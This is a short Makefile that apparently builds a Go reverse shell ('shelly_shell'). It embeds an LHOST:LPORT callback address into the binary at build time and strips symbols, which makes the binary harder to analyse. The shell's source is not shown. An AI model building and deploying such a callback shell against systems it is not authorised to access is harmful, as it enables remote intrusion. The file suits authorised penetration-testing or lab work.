# Makefile
SOURCE=shelly_shell.go
BUILD=go build
OUTPUT=shelly_shell
LDFLAGS=--ldflags "-s -w -X main.ip=${LHOST}:${LPORT}"

all:
	${BUILD} ${LDFLAGS} -o ${OUTPUT} ${SOURCE}

clean:
	rm -f ${OUTPUT}
